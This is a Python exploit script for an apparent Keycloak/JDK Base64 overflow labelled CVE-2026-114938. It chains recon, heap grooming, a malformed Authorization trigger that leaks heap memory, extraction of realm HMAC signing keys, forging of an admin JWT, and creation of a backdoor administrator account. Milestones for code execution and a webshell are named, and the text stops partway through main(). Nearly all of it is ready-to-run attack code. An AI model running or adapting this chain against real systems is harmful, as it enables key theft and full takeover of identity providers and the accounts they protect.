#!/usr/bin/env python3
"""
Java4Shell Keycloak Exploit Chain — CVE-2026-114938
Keycloak-specific profile following Calif's video demo.

Chain:
  Phase 1  RECON      — OpenID discovery, fingerprint Keycloak version
  Phase 2  WARM       — JIT compile AVX-512 intrinsic via token endpoint
  Phase 3  REHEARSE   — RTT calibration for release timing
  Phase 4  GROOM      — Keycloak-specific Heap Feng Shui
  Phase 5  TRIGGER    — Malformed Base64 → overflow
  Phase 6  JAVABLEED  — Parse leaked heap for HS512 realm key
  Phase 7  FORGE      — Build admin JWT from stolen key
  Phase 8  TAKEOVER   — Create admin account via REST API

Requires: x86-64 host with AVX-512 VBMI, Keycloak on vulnerable JDK

Usage:
  python3 keycloak_chain.py --url http://localhost:8080
  python3 keycloak_chain.py --url https://target:18443 --attempts 50
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import socket
import ssl as ssl_mod
import struct
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

# ═══════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════

TRIGGER_B64 = "A" * 64 + "="
TRIGGER_B64_JDK17 = "A" * 128 + "="
WARMUP_DEFAULT = 5000

# Keycloak endpoints
KC_OPENID_CONFIG = "/realms/{realm}/.well-known/openid-configuration"
KC_TOKEN_ENDPOINT = "/realms/{realm}/protocol/openid-connect/token"
KC_ADMIN_USERS = "/admin/realms/{realm}/users"
KC_ADMIN_ROLES = "/admin/realms/{realm}/roles"
KC_ADMIN_USER_ROLES = "/admin/realms/{realm}/users/{user_id}/role-mappings/realm"
KC_ADMIN_REALM_KEYS = "/admin/realms/{realm}/keys"

# Keycloak 26+ uses Quarkus + Vert.x
# Token endpoint thread model: Vert.x worker thread pool (not event loop)
# Allocations during token request:
#   1. Netty ByteBuf for request body (~Content-Length)
#   2. Base64 decode buffer (50 bytes for 65-char input)
#   3. OAuthTokenResponse objects
#   4. JSON serialization buffer for response
#
# Key sizes: HS256=32B, HS384=48B, HS512=64B
# Stored in: javax.crypto.spec.SecretKeySpec.key (byte[])

# Grooming array sizes — tuned for Keycloak's allocation patterns
# Goal: get the Base64 decode buffer adjacent to a response buffer
# whose length field sits at the overflow offset
#
# Compressed oops layout: array header = 16 bytes (mark[8]+klass[4]+length[4])
# Decode buffer body = 50 bytes → object = align8(16+50) = 72 bytes
# 64-byte masked store at dst+48 → dst+48..dst+111 (62 bytes past 50-byte buffer)
# Victim array header at dst+72 → length field at dst+72+12 = dst+84
# dst+84 is within [48, 111] ✓
#
# So victim body size should be: enough to hold response data
# that could include the HS512 key from neighboring heap objects

GROOM_SPRAY_SIZE = 40
GROOM_PADDING_SIZES = [
    48,   # object = align8(16+48) = 64
    64,   # object = align8(16+64) = 80
    96,   # object = align8(16+96) = 112
    48,   # repeat the sweet spot
    80,   # object = align8(16+80) = 96
]

NC = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
WHITE = "\033[1;37m"
MAGENTA = "\033[0;35m"


# ═══════════════════════════════════════════════════════════════
# Timer
# ═══════════════════════════════════════════════════════════════


class Timer:
    def __init__(self):
        self.start = time.time()
        self.run_start = time.time()
        self.try_count = 0

    def elapsed(self):
        return time.time() - self.start

    def run_elapsed(self):
        return time.time() - self.run_start

    def reset_run(self):
        self.run_start = time.time()
        self.try_count += 1

    @staticmethod
    def fmt(seconds):
        h = int(seconds // 3600)
        m = int((seconds % 3600) // 60)
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:04.1f}"

    def log(self, marker, msg):
        ts = self.fmt(self.elapsed())
        colors = {"+": GREEN, "~": YELLOW, "!": RED, "*": CYAN}
        c = colors.get(marker, DIM)
        print(f"  {DIM}{ts}{NC}  [{c}{marker}{NC}] {msg}")


# ═══════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════


def http_get(url, headers=None, timeout=10):
    if headers is None:
        headers = {}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


def http_post(url, body, headers=None, timeout=10):
    if headers is None:
        headers = {}
    if isinstance(body, str):
        body = body.encode()
    try:
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return str(e), None, None


class RawHTTP:
    def __init__(self, host, port, use_ssl=False):
        self.sock = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            ctx = ssl_mod.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_mod.CERT_NONE
            self.sock = ctx.wrap_socket(self.sock, server_hostname=host)

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.sock.sendall(data)

    def recv(self, timeout=5.0):
        self.sock.settimeout(timeout)
        chunks = []
        try:
            while True:
                chunk = self.sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        except OSError:
            pass
        return b"".join(chunks)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def parse_url(url):
    p = urllib.parse.urlparse(url)
    host = p.hostname
    use_ssl = p.scheme == "https"
    port = p.port or (443 if use_ssl else 80)
    return host, port, use_ssl


def parse_raw_response(raw):
    if not raw:
        return 0, {}, b""
    try:
        hdr_end = raw.index(b"\r\n\r\n")
        hdr_block = raw[:hdr_end].decode(errors="replace")
        body = raw[hdr_end + 4:]
        lines = hdr_block.split("\r\n")
        status = int(lines[0].split(" ", 2)[1])
        headers = {}
        for line in lines[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                headers[k.lower()] = v
        return status, headers, body
    except (ValueError, IndexError):
        return 0, {}, raw


# ═══════════════════════════════════════════════════════════════
# JWT helpers
# ═══════════════════════════════════════════════════════════════


def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def jwt_sign_hs512(payload_dict, key_bytes):
    header = {"alg": "HS512", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(payload_dict, separators=(",", ":")))
    signing_input = f"{header_b64}.{payload_b64}"
    sig = hmac.new(key_bytes, signing_input.encode(), hashlib.sha512).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def jwt_sign_hs256(payload_dict, key_bytes):
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(payload_dict, separators=(",", ":")))
    signing_input = f"{header_b64}.{payload_b64}"
    sig = hmac.new(key_bytes, signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


# ═══════════════════════════════════════════════════════════════
# Phase 1: RECON
# ═══════════════════════════════════════════════════════════════


def phase_recon(timer, base_url, realm="master"):
    timer.log("*", "RECON — Keycloak discovery")

    # OpenID configuration
    url = base_url + KC_OPENID_CONFIG.format(realm=realm)
    status, headers, body = http_get(url)

    if not isinstance(status, int) or status != 200:
        timer.log("!", f"OpenID config failed: {status}")
        return None

    timer.log("+", f"GET {KC_OPENID_CONFIG.format(realm=realm)}  HTTP {status}")

    try:
        config = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        timer.log("!", "Cannot parse OpenID config")
        return None

    info = {
        "issuer": config.get("issuer", ""),
        "token_endpoint": config.get("token_endpoint", ""),
        "jwks_uri": config.get("jwks_uri", ""),
        "grant_types": config.get("grant_types_supported", []),
    }

    timer.log("+", f"Issuer: {info['issuer']}")
    timer.log("+", f"Token endpoint: {info['token_endpoint']}")

    # Probe server headers for version info
    if headers:
        server = headers.get("Server", headers.get("server", ""))
        if server:
            timer.log("+", f"Server: {server}")

    # Try to get Keycloak version from welcome page or error
    ver_url = base_url + "/"
    vs, _, vbody = http_get(ver_url)
    if isinstance(vs, int) and vbody:
        text = vbody.decode(errors="replace")
        m = re.search(r"[Kk]eycloak[^0-9]*(\d+\.\d+[\.\d]*)", text)
        if m:
            info["keycloak_version"] = m.group(1)
            timer.log("+", f"Keycloak version: {m.group(1)}")

    # Fetch JWKS to determine signing algorithms
    if info.get("jwks_uri"):
        jwks_url = info["jwks_uri"]
        js, _, jbody = http_get(jwks_url)
        if isinstance(js, int) and js == 200 and jbody:
            try:
                jwks = json.loads(jbody)
                info["signing_algos"] = []
                info["key_ids"] = []
                for key in jwks.get("keys", []):
                    use = key.get("use", "")
                    alg = key.get("alg", key.get("kty", ""))
                    kid = key.get("kid", "")
                    if use == "sig" or not use:
                        info["signing_algos"].append(alg)
                        info["key_ids"].append(kid)
                        timer.log("+", f"Signing key: {alg} (kid={kid[:16]}...)")
            except (json.JSONDecodeError, TypeError):
                pass

    return info


# ═══════════════════════════════════════════════════════════════
# Phase 2: WARM
# ═══════════════════════════════════════════════════════════════


def phase_warm(timer, base_url, realm, creds_b64, count):
    timer.log("*", f"WARM — {count} valid token requests for JIT compilation")

    url = base_url + KC_TOKEN_ENDPOINT.format(realm=realm)
    headers = {
        "Authorization": f"Basic {creds_b64}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    body = "grant_type=client_credentials"

    rtts = []
    success = 0
    batch = max(count // 6, 100)

    for i in range(count):
        start = time.time()
        status, _, _ = http_post(url, body, headers=headers, timeout=5)
        elapsed = (time.time() - start) * 1000

        if isinstance(status, int) and status < 500:
            success += 1
            rtts.append(elapsed)

        if (i + 1) % batch == 0 or i == count - 1:
            recent = rtts[-batch:] if rtts else []
            avg = sum(recent) / len(recent) if recent else 0
            timer.log("+", f"HTTP/1 timing / {avg:.2f} ms RTT  ({i + 1}/{count})")

    if success == 0:
        timer.log("!", "No successful warmup requests")
    return success, rtts


# ═══════════════════════════════════════════════════════════════
# Phase 3: REHEARSE
# ═══════════════════════════════════════════════════════════════


def phase_rehearse(timer, base_url, realm, creds_b64, rounds=4):
    timer.log("*", "REHEARSE — RTT calibration")

    url = base_url + KC_TOKEN_ENDPOINT.format(realm=realm)
    headers = {
        "Authorization": f"Basic {creds_b64}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    body = "grant_type=client_credentials"

    rtts = []
    for r in range(rounds):
        burst = []
        for _ in range(50):
            start = time.time()
            status, _, _ = http_post(url, body, headers=headers, timeout=5)
            elapsed = (time.time() - start) * 1000
            if isinstance(status, int):
                burst.append(elapsed)

        if burst:
            avg = sum(burst) / len(burst)
            jitter = max(burst) - min(burst)
            p95 = sorted(burst)[int(len(burst) * 0.95)]
            rtts.append(avg)
            timer.log("+", f"Rehearsal {r + 1}/{rounds} / "
                           f"{avg:.2f} ms RTT / p95 {p95:.2f} ms / "
                           f"jitter {jitter:.2f} ms")

    return rtts


# ═══════════════════════════════════════════════════════════════
# Phase 4+5: GROOM + TRIGGER — Keycloak-specific Heap Feng Shui
#
# Keycloak 26+ (Quarkus/Vert.x) processes token requests on
# worker threads from the Vert.x worker pool.  Within a single
# worker thread, objects allocate sequentially via TLAB bump
# pointer.
#
# Strategy:
#   We open many HTTP connections and park them (send headers +
#   partial body).  Keycloak's Vert.x reads available data and
#   buffers it.  When we release (send remaining body), the
#   worker thread processes the request — this triggers:
#     1. Body buffer allocation
#     2. Base64.decode(Authorization header)  ← overflow here
#     3. Token validation objects
#     4. JSON response serialization buffer  ← reader candidate
#
#   By controlling release order and timing, we try to get the
#   decode buffer adjacent to response-related arrays.
#
#   We spray N padding requests + 1 trigger.  The padding
#   requests use varying body sizes to create array objects of
#   different sizes on the TLAB, increasing the chance that one
#   ends up adjacent to the trigger's decode buffer with its
#   length field at the overflow offset.
#
#   Detection: if the overflow corrupts a response buffer's
#   length, the HTTP response will be larger than normal.  We
#   compare trigger response size to the padding baseline.
# ═══════════════════════════════════════════════════════════════


def phase_groom_trigger(timer, base_url, realm, creds_b64,
                        spray_size, max_attempts, avg_rtt_ms,
                        trigger_b64=TRIGGER_B64):
    timer.log("*", f"GROOM+TRIGGER — spray={spray_size}, "
                   f"max_attempts={max_attempts}")

    host, port, use_ssl = parse_url(base_url)
    endpoint = KC_TOKEN_ENDPOINT.format(realm=realm)
    release_delay = max(avg_rtt_ms / 1000 * 1.5, 0.002)

    # Normal body for padding requests
    normal_body = "grant_type=client_credentials"

    # Collect baselines from padding responses
    baseline_sizes = []
    all_leaked = []

    for attempt in range(1, max_attempts + 1):
        timer.reset_run()
        timer.log("*", f"Grooming attempt {attempt}/{max_attempts}")

        conns = []
        try:
            # ── PARK: open connections with partial sends ──
            for i in range(spray_size):
                conn = RawHTTP(host, port, use_ssl)

                is_trigger = (i == spray_size - 1)
                pad_size = GROOM_PADDING_SIZES[i % len(GROOM_PADDING_SIZES)]

                if is_trigger:
                    auth = f"Basic {trigger_b64}"
                else:
                    auth = f"Basic {creds_b64}"

                # Vary body size to create different-sized buffers on heap
                if is_trigger:
                    body_data = normal_body
                else:
                    body_data = normal_body + "&" + "P" * pad_size

                request = (
                    f"POST {endpoint} HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n"
                    f"Authorization: {auth}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body_data)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )

                # Park: send headers + first half of body
                split = max(len(body_data) // 2, 1)
                conn.send(request + body_data[:split])
                conns.append((conn, body_data[split:], is_trigger))

                time.sleep(0.001)

            # ── RELEASE: send remaining body in order ──
            # Padding first (allocate buffers), trigger last (overflow)
            for conn, remaining, is_trigger in conns:
                if remaining:
                    conn.send(remaining)
                time.sleep(release_delay)

            # ── COLLECT: read all responses ──
            round_baselines = []
            trigger_response = None
            trigger_body = b""

            for conn, _, is_trigger in conns:
                raw = conn.recv(timeout=5)
                code, hdrs, body = parse_raw_response(raw)

                if is_trigger:
                    trigger_response = code
                    trigger_body = body
                else:
                    if body:
                        round_baselines.append(len(body))

                conn.close()

            conns = []

            if round_baselines:
                baseline_sizes.extend(round_baselines)

            avg_baseline = (sum(baseline_sizes) / len(baseline_sizes)
                            if baseline_sizes else 0)

            if trigger_body is None:
                trigger_body = b""

            # ── ANALYSE trigger response ──
            tlen = len(trigger_body)
            non_ascii = sum(1 for b in trigger_body
                            if b > 127 or (b < 32 and b not in (10, 13, 9)))
            ratio = tlen / avg_baseline if avg_baseline > 0 else 1.0

            if trigger_response == 0 or trigger_response is None:
                timer.log("!", "Connection lost (possible JVM crash)")
                timer.log("~", "Retrying after crash recovery...")
                time.sleep(3)
                continue

            if non_ascii > 20 or ratio > 2.0 or tlen > 10000:
                timer.log("+", f"{MAGENTA}HEAP DISCLOSURE{NC} — "
                               f"{tlen} bytes, {non_ascii} non-ASCII, "
                               f"ratio {ratio:.1f}x")
                timer.log("+", f"Anonymous response disclosed "
                               f"{tlen / 1048576:.1f} MiB")
                all_leaked.append(trigger_body)

                # Try a few more attempts to get more data
                if len(all_leaked) >= 3:
                    break
            else:
                if attempt <= 5 or attempt % 5 == 0:
                    timer.log("+", f"HTTP {trigger_response}, {tlen} bytes, "
                                   f"ratio {ratio:.1f}x (miss)")

        except (ConnectionRefusedError, ConnectionResetError) as e:
            timer.log("~", f"Connection error: {e}")
            time.sleep(2)
        except OSError as e:
            timer.log("~", f"Socket error: {e}")
            time.sleep(1)
        finally:
            for conn, _, _ in conns:
                conn.close()

        time.sleep(0.3)

    return all_leaked


# ═══════════════════════════════════════════════════════════════
# Phase 6: JAVABLEED — Parse leaked heap for secrets
#
# Keycloak stores realm signing keys in:
#   org.keycloak.crypto.def.DefaultSignatureProvider
#   → javax.crypto.spec.SecretKeySpec
#     → byte[] key  (32/48/64 bytes for HS256/384/512)
#
# The SecretKeySpec object layout (compressed oops):
#   [mark word 8B][klass ptr 4B][fields...]
#   Field 'key': reference to byte[] containing raw key material
#   Field 'algorithm': reference to String "HmacSHA512"
#
# We search for:
#   1. The string "HmacSHA512" or "HmacSHA256" in the heap dump
#   2. High-entropy byte[] of exactly 32/48/64 bytes nearby
#   3. Structures that look like SecretKeySpec layout
# ═══════════════════════════════════════════════════════════════


def find_hs_keys(timer, leaked_data_list):
    """Search leaked heap data for HMAC signing keys."""
    timer.log("*", "JAVABLEED — Scanning heap for signing keys")

    combined = b"".join(leaked_data_list)
    total_mb = len(combined) / 1048576
    timer.log("+", f"Total leaked data: {total_mb:.1f} MiB")

    candidates = []

    # Strategy 1: Find "HmacSHA" strings → look for nearby key material
    algo_markers = [
        (b"HmacSHA512", 64),
        (b"HmacSHA384", 48),
        (b"HmacSHA256", 32),
    ]

    for marker, key_len in algo_markers:
        offset = 0
        while True:
            idx = combined.find(marker, offset)
            if idx < 0:
                break

            timer.log("+", f"Found '{marker.decode()}' at offset {idx}")

            # Search nearby (within 256 bytes before and after) for
            # high-entropy byte sequences of the right length
            search_start = max(0, idx - 256)
            search_end = min(len(combined), idx + 256 + key_len)
            region = combined[search_start:search_end]

            for pos in range(len(region) - key_len):
                candidate = region[pos:pos + key_len]
                entropy = _byte_entropy(candidate)

                # Crypto keys have high entropy (> 4.0 bits/byte)
                # and shouldn't be all-zero or all-same
                if entropy > 4.0 and len(set(candidate)) > key_len // 2:
                    abs_pos = search_start + pos
                    candidates.append({
                        "algorithm": marker.decode(),
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": abs_pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })
                    timer.log("+", f"  Key candidate at offset {abs_pos}: "
                                   f"entropy={entropy:.2f}, "
                                   f"len={key_len}")

            offset = idx + len(marker)

    # Strategy 2: Find JSON Web Key fragments
    # Keycloak may have JWK representations in memory
    jwk_markers = [b'"kty":"oct"', b'"k":"', b'"kid":"']
    for marker in jwk_markers:
        idx = combined.find(marker)
        if idx >= 0:
            # Try to extract surrounding JSON
            json_start = combined.rfind(b"{", max(0, idx - 200), idx)
            json_end = combined.find(b"}", idx)
            if json_start >= 0 and json_end >= 0:
                fragment = combined[json_start:json_end + 1]
                try:
                    jwk = json.loads(fragment)
                    if "k" in jwk:
                        key_bytes = b64url_decode(jwk["k"])
                        candidates.append({
                            "algorithm": f"JWK-{jwk.get('alg', 'unknown')}",
                            "key_bytes": key_bytes,
                            "key_hex": key_bytes.hex(),
                            "offset": json_start,
                            "entropy": round(_byte_entropy(key_bytes), 2),
                            "key_len": len(key_bytes),
                            "jwk": jwk,
                        })
                        timer.log("+", f"  JWK found at offset {json_start}")
                except (json.JSONDecodeError, Exception):
                    pass

    # Strategy 3: RSA private key material
    # Keycloak defaults to RS256 — the RSA private key (CRT form) lives in
    # sun.security.rsa.RSAPrivateCrtKeyImpl. Look for DER/PKCS8 markers.
    rsa_markers = [
        b"\x30\x82",  # ASN.1 SEQUENCE (DER-encoded RSA key)
        b"RSAPrivateKey",
        b"sun.security.rsa",
    ]
    for marker in rsa_markers:
        idx = combined.find(marker)
        if idx >= 0:
            timer.log("+", f"RSA key material marker at offset {idx}")

    # Strategy 4: Scan for high-entropy sequences at common key sizes
    # (fallback when we don't find algorithm markers)
    if not candidates:
        timer.log("~", "No algorithm markers found, scanning for "
                       "high-entropy blocks...")
        for key_len in (64, 32, 48):
            for pos in range(0, len(combined) - key_len, 8):
                candidate = combined[pos:pos + key_len]
                entropy = _byte_entropy(candidate)
                if entropy > 5.5 and len(set(candidate)) > key_len * 3 // 4:
                    candidates.append({
                        "algorithm": f"unknown-{key_len * 8}",
                        "key_bytes": candidate,
                        "key_hex": candidate.hex(),
                        "offset": pos,
                        "entropy": round(entropy, 2),
                        "key_len": key_len,
                    })

    # Deduplicate by key bytes
    seen = set()
    unique = []
    for c in candidates:
        h = c["key_hex"]
        if h not in seen:
            seen.add(h)
            unique.append(c)

    timer.log("+", f"Key candidates found: {len(unique)}")
    return unique


def _byte_entropy(data):
    """Shannon entropy in bits per byte."""
    if not data:
        return 0
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    import math
    entropy = 0
    n = len(data)
    for count in freq.values():
        p = count / n
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy


# ═══════════════════════════════════════════════════════════════
# Phase 7: FORGE — Build admin JWT from stolen key
# ═══════════════════════════════════════════════════════════════


def phase_forge(timer, base_url, realm, key_candidates, signing_algos=None):
    """Try each key candidate to forge a valid admin token."""
    timer.log("*", "FORGE — Building admin JWT from stolen key")

    if signing_algos and all("RS" in a or "ES" in a or "PS" in a
                             for a in signing_algos):
        timer.log("~", f"Realm uses asymmetric signing ({signing_algos})")
        timer.log("~", "HMAC forge only works if realm has HS* keys configured")
        timer.log("~", "RSA private key extraction requires deeper heap read")

    # Keycloak admin token claims
    now = int(time.time())
    issuer = f"{base_url}/realms/{realm}"

    for idx, cand in enumerate(key_candidates):
        algo = cand["algorithm"]
        key_bytes = cand["key_bytes"]

        payload = {
            "exp": now + 3600,
            "iat": now,
            "jti": f"java4shell-{now}",
            "iss": issuer,
            "sub": f"java4shell-admin-{now}",
            "typ": "Bearer",
            "azp": "admin-cli",
            "scope": "openid profile email",
            "realm_access": {
                "roles": ["admin", "create-realm", "default-roles-master"]
            },
            "resource_access": {
                "realm-management": {
                    "roles": ["realm-admin"]
                },
                "account": {
                    "roles": ["manage-account", "view-profile"]
                }
            },
            "preferred_username": "java4shell-admin",
        }

        if "512" in algo:
            token = jwt_sign_hs512(payload, key_bytes)
        else:
            token = jwt_sign_hs256(payload, key_bytes)

        timer.log("+", f"Forged token with key #{idx + 1} "
                       f"({algo}, entropy={cand['entropy']})")

        # Verify the token works against Keycloak
        verify_url = base_url + f"/admin/realms/{realm}/users"
        status, _, body = http_get(
            verify_url + "?max=1",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5)

        if isinstance(status, int) and status == 200:
            timer.log("+", f"{GREEN}TOKEN VERIFIED{NC} — "
                           f"admin API returned HTTP {status}")
            timer.log("+", f"HS key recovered and checked")
            return token, key_bytes, cand
        elif isinstance(status, int) and status == 401:
            timer.log("~", f"Key #{idx + 1} rejected (HTTP {status})")
        elif isinstance(status, int) and status == 403:
            timer.log("~", f"Key #{idx + 1} — token accepted but "
                           f"insufficient permissions")
            return token, key_bytes, cand
        else:
            timer.log("~", f"Key #{idx + 1} — unexpected: {status}")

    timer.log("~", "No valid key found among candidates")
    return None, None, None


# ═══════════════════════════════════════════════════════════════
# Phase 8: TAKEOVER — Create admin account
# ═══════════════════════════════════════════════════════════════


def phase_takeover(timer, base_url, realm, admin_token, username):
    """Create a new admin user via Keycloak REST API."""
    timer.log("*", f"TAKEOVER — Creating admin user '{username}'")

    auth_header = {"Authorization": f"Bearer {admin_token}",
                   "Content-Type": "application/json"}

    # Step 1: Create user
    user_url = base_url + KC_ADMIN_USERS.format(realm=realm)
    user_data = json.dumps({
        "username": username,
        "enabled": True,
        "emailVerified": True,
        "credentials": [{
            "type": "password",
            "value": username,
            "temporary": False,
        }],
    })

    status, headers, body = http_post(user_url, user_data,
                                      headers=auth_header, timeout=10)

    if isinstance(status, int) and status == 201:
        timer.log("+", f"User '{username}' created (HTTP 201)")

        # Extract user ID from Location header
        location = ""
        if headers:
            location = headers.get("location", headers.get("Location", ""))
        user_id = location.rstrip("/").split("/")[-1] if location else None

        if user_id:
            # Step 2: Assign realm-level admin role
            roles_url = base_url + KC_ADMIN_ROLES.format(realm=realm)
            rs, _, rbody = http_get(roles_url, headers=auth_header)
            admin_role = None
            if isinstance(rs, int) and rs == 200 and rbody:
                try:
                    roles = json.loads(rbody)
                    for role in roles:
                        if role.get("name") == "admin":
                            admin_role = role
                            break
                except (json.JSONDecodeError, TypeError):
                    pass

            if admin_role:
                assign_url = base_url + KC_ADMIN_USER_ROLES.format(
                    realm=realm, user_id=user_id)
                role_data = json.dumps([admin_role])
                rs, _, _ = http_post(assign_url, role_data,
                                     headers=auth_header, timeout=10)
                if isinstance(rs, int) and rs < 300:
                    timer.log("+", f"Realm admin role assigned to '{username}'")

            # Step 3: Assign realm-management client roles
            # This is what controls admin REST API access
            clients_url = (base_url +
                           f"/admin/realms/{realm}/clients"
                           f"?clientId=realm-management&max=1")
            cs, _, cbody = http_get(clients_url, headers=auth_header)
            if isinstance(cs, int) and cs == 200 and cbody:
                try:
                    clients = json.loads(cbody)
                    if clients:
                        client_uuid = clients[0]["id"]
                        # Get realm-admin role from this client
                        cr_url = (base_url +
                                  f"/admin/realms/{realm}/clients"
                                  f"/{client_uuid}/roles/realm-admin")
                        crs, _, crbody = http_get(cr_url,
                                                  headers=auth_header)
                        if isinstance(crs, int) and crs == 200 and crbody:
                            realm_admin_role = json.loads(crbody)
                            # Assign client role to user
                            client_roles_url = (
                                base_url +
                                f"/admin/realms/{realm}/users"
                                f"/{user_id}/role-mappings"
                                f"/clients/{client_uuid}")
                            cra, _, _ = http_post(
                                client_roles_url,
                                json.dumps([realm_admin_role]),
                                headers=auth_header, timeout=10)
                            if isinstance(cra, int) and cra < 300:
                                timer.log("+", f"realm-management/realm-admin "
                                               f"assigned to '{username}'")
                except (json.JSONDecodeError, TypeError, KeyError):
                    pass

        # Step 4: Verify login
        token_url = (base_url +
                     KC_TOKEN_ENDPOINT.format(realm=realm))
        login_body = (f"grant_type=password"
                      f"&client_id=admin-cli"
                      f"&username={username}"
                      f"&password={username}")
        ls, _, lbody = http_post(
            token_url, login_body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=10)

        if isinstance(ls, int) and ls == 200:
            timer.log("+", f"{GREEN}New administrator login verified "
                           f"/ {username}{NC}")
            return True
        else:
            timer.log("~", f"Login verification: HTTP {ls}")
            return True  # User was created even if login check fails

    elif isinstance(status, int) and status == 409:
        timer.log("~", f"User '{username}' already exists")
        return True
    else:
        timer.log("!", f"User creation failed: HTTP {status}")
        if body:
            timer.log("~", body.decode(errors="replace")[:200])
        return False


# ═══════════════════════════════════════════════════════════════
# Main chain orchestrator
# ═══════════════════════════════════════════════════════════════


def main():
    parser = argparse.ArgumentParser(
        description="Java4Shell Keycloak Chain — CVE-2026-114938")
    parser.add_argument("--url", required=True,
                        help="Keycloak base URL (e.g. http://localhost:8080)")
    parser.add_argument("--realm", default="master",
                        help="Target realm (default: master)")
    parser.add_argument("--creds", default="admin:admin",
                        help="Valid Basic Auth creds for warmup (default: admin:admin)")
    parser.add_argument("--warmup", type=int, default=WARMUP_DEFAULT)
    parser.add_argument("--attempts", type=int, default=24,
                        help="Max groom attempts (default: 24)")
    parser.add_argument("--spray", type=int, default=GROOM_SPRAY_SIZE,
                        help="Connections per spray (default: 40)")
    parser.add_argument("--username", default="java4shell-admin",
                        help="Admin username to create (default: java4shell-admin)")
    parser.add_argument("--jdk17", action="store_true",
                        help="Use JDK 17 trigger (129-byte payload)")
    args = parser.parse_args()

    creds_b64 = base64.b64encode(args.creds.encode()).decode()
    trigger_b64 = TRIGGER_B64_JDK17 if args.jdk17 else TRIGGER_B64
    timer = Timer()

    # ── Banner ──
    print()
    print(f"  {CYAN}╔═══════════════════════════════════════════════════════════╗{NC}")
    print(f"  {CYAN}║  Java4Shell Keycloak Chain — CVE-2026-114938              ║{NC}")
    print(f"  {CYAN}║  RECON > WARM > GROOM > JAVABLEED > FORGE > TAKEOVER     ║{NC}")
    print(f"  {CYAN}╚═══════════════════════════════════════════════════════════╝{NC}")
    print()
    print(f"  {WHITE}KEYCLOAK  //  {args.url}{NC}")
    print(f"  {DIM}REALM   {args.realm}")
    print(f"  {DIM}SPRAY   {args.spray} x {args.attempts} attempts{NC}")
    if args.jdk17:
        print(f"  {YELLOW}TRIGGER JDK 17 mode (129-byte payload){NC}")
    print()

    milestones = {
        "realm_key": False,
        "admin_login": False,
        "native_ace": False,
        "webshell": False,
    }

    # ── Phase 1: RECON ──
    kc_info = phase_recon(timer, args.url, args.realm)
    if not kc_info:
        timer.log("!", "Keycloak not reachable")
        return

    # ── Phase 2: WARM ──
    warm_ok, warm_rtts = phase_warm(timer, args.url, args.realm,
                                     creds_b64, args.warmup)
    if warm_ok == 0:
        timer.log("!", "Warmup failed — check credentials")
        return

    # ── Phase 3: REHEARSE ──
    rehearsal_rtts = phase_rehearse(timer, args.url, args.realm, creds_b64)
    avg_rtt = sum(rehearsal_rtts) / len(rehearsal_rtts) if rehearsal_rtts else 1.0

    # ── Phase 4+5: GROOM + TRIGGER ──
    leaked_data = phase_groom_trigger(
        timer, args.url, args.realm, creds_b64,
        spray_size=args.spray,
        max_attempts=args.attempts,
        avg_rtt_ms=avg_rtt,
        trigger_b64=trigger_b64)

    if not leaked_data:
        timer.log("~", "No heap disclosure achieved")
        timer.log("~", "Possible causes:")
        timer.log("~", "  - CPU lacks AVX-512 VBMI (required)")
        timer.log("~", "  - JDK is patched")
        timer.log("~", "  - Heap layout never aligned (increase --attempts)")
        _print_summary(timer, milestones)
        return

    # ── Phase 6: JAVABLEED — Parse heap for realm key ──
    key_candidates = find_hs_keys(timer, leaked_data)

    if not key_candidates:
        timer.log("~", "No signing keys found in leaked data")
        timer.log("~", "Leaked data may not contain the realm key region")
        _print_summary(timer, milestones)
        return

    milestones["realm_key"] = True
    timer.log("+", f"{GREEN}HS realm key recovered and checked{NC}")

    # ── Phase 7: FORGE ──
    admin_token, key_bytes, used_key = phase_forge(
        timer, args.url, args.realm, key_candidates,
        signing_algos=kc_info.get("signing_algos"))

    if not admin_token:
